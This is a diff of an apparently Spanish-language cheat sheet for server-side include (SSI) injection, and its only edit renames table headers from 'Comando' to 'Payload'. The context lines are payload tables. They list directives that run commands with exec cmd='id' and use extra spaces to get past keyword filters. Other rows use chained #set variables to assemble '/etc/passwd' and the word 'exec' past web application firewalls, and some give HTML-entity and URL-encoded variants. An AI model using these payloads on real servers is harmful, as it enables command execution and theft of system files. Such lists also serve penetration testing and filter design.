@@ -20,7 +20,7 @@ linked:
 
 ## Whitespace Tricks
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#  exec cmd="id"-->` | Bypassea filtro de `<!--#exec` literal | Multi-espacio tras `#` |
 | `<!-- #exec cmd="id" -->` | Bypassea filtro de `#exec` | Espacio tras `<!--` |
@@ -37,7 +37,7 @@ linked:
 
 ## `#set` Concatenation
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#set var="p1" value="/etc/" --><!--#set var="p2" value="passwd" --><!--#include file="$p1$p2" -->` | Arma `/etc/passwd` partido en vars | WAF que matchea el path literal |
 | `<!--#set var="a" value="ex" --><!--#set var="b" value="ec" --><!--#exec cmd="$a$b cmd" -->` | Arma la keyword `exec` partida | WAF que filtra `exec` |
@@ -69,7 +69,7 @@ linked:
 
 ## Encoding y CGI Fallback
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `&lt;!--#exec cmd="id"--&gt;` | Directive con entidades HTML | Si la app decodifica antes de parsear |
 | `%3C!--%23exec%20cmd=%22id%22--%3E` | Directive URL-encoded | Bypass de filtros simples |
